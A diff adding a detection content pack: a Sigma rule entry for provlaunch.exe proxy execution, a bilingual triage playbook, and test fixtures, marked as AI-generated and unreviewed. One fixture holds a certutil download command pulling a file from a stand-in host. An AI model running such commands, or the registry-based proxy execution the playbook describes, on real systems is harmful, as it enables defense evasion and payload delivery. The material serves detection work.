@@ -1,0 +1,133 @@
+{
+  "rule": {
+    "id": "7f5d1c9a-3e83-48df-95a7-2b98aae6c13c",
+    "title": "Potential Provlaunch.EXE Binary Proxy Execution Abuse",
+    "level": "medium",
+    "status": "test",
+    "author": "Nasreddine Bencherchali (Nextron Systems), Swachchhanda Shrawan Poudel",
+    "path": "windows/process_creation/proc_creation_win_provlaunch_potential_abuse.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_provlaunch_potential_abuse.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1218"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "provlaunch.exe, el lanzador de comandos de aprovisionamiento de Windows, inició un proceso hijo que no figura en la lista de binarios que ya cubre la regla relacionada. Esto puede indicar ejecución por proxy para evadir controles.",
+      "what_it_detects": "Eventos de creación de procesos cuyo ParentImage termina en \\provlaunch.exe. Se excluyen los hijos que ya alerta la regla f9999590 (cmd, powershell, rundll32, mshta, etc.) y los que se ejecutan desde rutas sospechosas como \\Windows\\Temp\\ o \\Users\\Public\\.",
+      "why_it_matters": "provlaunch.exe ejecuta comandos definidos en HKLM\\SOFTWARE\\Microsoft\\Provisioning\\Commands. Un atacante con privilegios de administrador puede registrar ahí un comando y lanzarlo bajo un binario firmado por Microsoft (T1218, ejecución por proxy de binarios del sistema) para eludir el control de aplicaciones.",
+      "triage_steps": [
+        "Revise Image, CommandLine y el hash del hijo: identifique el binario, quién lo firmó y su reputación.",
+        "Revise ParentCommandLine: el argumento de provlaunch.exe indica el nombre del comando de aprovisionamiento que se invocó.",
+        "Inspeccione HKLM\\SOFTWARE\\Microsoft\\Provisioning\\Commands en el host y busque subclaves o valores CommandLine creados recientemente.",
+        "Identifique el proceso que lanzó provlaunch.exe y el usuario; fuera de un aprovisionamiento real, su ejecución es poco común.",
+        "Pivotee en el mismo host +/- 15 minutos: modificaciones de registro, archivos nuevos, conexiones de red y procesos nietos del hijo.",
+        "Busque alertas previas de las reglas relacionadas (f9999590, 2a4b3e61, 7021255e) para el mismo host o usuario.",
+        "Confirme con TI si hubo un despliegue de paquetes de aprovisionamiento (PPKG) o de Autopilot en ese equipo."
+      ],
+      "false_positives": [
+        "Aprovisionamiento legítimo de Windows (paquetes PPKG, Autopilot o imágenes OEM) que ejecuta instaladores o scripts propios.",
+        "Herramientas de gestión de endpoints que usan el mecanismo de comandos de aprovisionamiento durante la configuración inicial."
+      ],
+      "response_steps": [
+        "Verifique con el responsable del equipo si el aprovisionamiento era esperado antes de tomar acciones.",
+        "Si es malicioso, aísle el endpoint y conserve el binario hijo, su hash y la exportación de la clave de registro.",
+        "Elimine la entrada maliciosa en Provisioning\\Commands y los artefactos asociados, solo después de documentarlos.",
+        "Revise la cuenta de administrador usada, restablezca sus credenciales y busque el mismo hash o la misma clave en otros hosts."
+      ],
+      "severity_rationale": "El nivel medio es adecuado porque provlaunch.exe rara vez tiene hijos fuera de un aprovisionamiento, pero el binario hijo no está entre los ya catalogados como de alto riesgo."
+    },
+    "en": {
+      "summary": "provlaunch.exe, the Windows provisioning command launcher, spawned a child process that the related CLI-abuse rule does not already cover. This may be proxy execution meant to evade defenses.",
+      "what_it_detects": "Process creation events whose ParentImage ends with \\provlaunch.exe. Children already alerted by rule f9999590 (cmd, powershell, rundll32, mshta, etc.) and images running from suspicious paths such as \\Windows\\Temp\\ or \\Users\\Public\\ are excluded.",
+      "why_it_matters": "provlaunch.exe runs commands defined under HKLM\\SOFTWARE\\Microsoft\\Provisioning\\Commands. An attacker with admin rights can register a command there and launch it under a Microsoft-signed binary (T1218, system binary proxy execution) to get around application control.",
+      "triage_steps": [
+        "Review the child's Image, CommandLine and hash: identify the binary, its signer and its reputation.",
+        "Review ParentCommandLine: the provlaunch.exe argument names the provisioning command that was invoked.",
+        "Inspect HKLM\\SOFTWARE\\Microsoft\\Provisioning\\Commands on the host for recently created subkeys or CommandLine values.",
+        "Identify what launched provlaunch.exe and under which user. Outside real provisioning it rarely runs.",
+        "Pivot on the same host +/- 15 minutes: registry changes, new files, network connections and the child's own children.",
+        "Look for earlier alerts from related rules (f9999590, 2a4b3e61, 7021255e) for the same host or user.",
+        "Confirm with IT whether a provisioning package (PPKG) or Autopilot deployment ran on that machine."
+      ],
+      "false_positives": [
+        "Legitimate Windows provisioning (PPKG packages, Autopilot or OEM images) that runs its own installers or scripts.",
+        "Endpoint management tooling that uses the provisioning command mechanism during initial setup."
+      ],
+      "response_steps": [
+        "Before acting, confirm with the device owner whether provisioning was expected.",
+        "If it is malicious, isolate the endpoint and preserve the child binary, its hash and an export of the registry key.",
+        "After documenting them, remove the malicious Provisioning\\Commands entry and related artifacts.",
+        "Review the admin account that was used, reset its credentials and hunt for the same hash or key on other hosts."
+      ],
+      "severity_rationale": "Medium fits because provlaunch.exe rarely has children outside provisioning, but this child is not one of the binaries already flagged as high risk."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "provlaunch.exe spawns an unsigned binary from ProgramData via a registered provisioning command",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\adm-jperez",
+          "ParentImage": "C:\\Windows\\System32\\provlaunch.exe",
+          "ParentCommandLine": "provlaunch.exe LOLBin",
+          "Image": "C:\\ProgramData\\SyncHelper\\synchelper.exe",
+          "CommandLine": "\"C:\\ProgramData\\SyncHelper\\synchelper.exe\" -silent",
+          "IntegrityLevel": "High",
+          "Hashes": "SHA256=0000000000000000000000000000000000000000000000000000000000000001"
+        }
+      },
+      {
+        "description": "provlaunch.exe proxies execution of certutil.exe, which the CLI-abuse rule does not cover",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "NT AUTHORITY\\SYSTEM",
+          "ParentImage": "C:\\Windows\\System32\\provlaunch.exe",
+          "ParentCommandLine": "provlaunch.exe UpdateCfg",
+          "Image": "C:\\Windows\\System32\\certutil.exe",
+          "CommandLine": "certutil.exe -urlcache -f https://files.example.org/cfg.bin C:\\ProgramData\\cfg.bin",
+          "IntegrityLevel": "System"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "provlaunch.exe spawns cmd.exe; excluded by the filter because rule f9999590 covers it",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\adm-jperez",
+          "ParentImage": "C:\\Windows\\System32\\provlaunch.exe",
+          "ParentCommandLine": "provlaunch.exe LOLBin",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "cmd.exe /c whoami",
+          "IntegrityLevel": "High"
+        }
+      },
+      {
+        "description": "Binary running from C:\\Users\\Public\\ with a parent other than provlaunch.exe",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0310.andes.example.com",
+          "User": "ANDES\\mrojas",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "ParentCommandLine": "C:\\Windows\\Explorer.EXE",
+          "Image": "C:\\Users\\Public\\tools\\viewer.exe",
+          "CommandLine": "\"C:\\Users\\Public\\tools\\viewer.exe\"",
+          "IntegrityLevel": "Medium"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
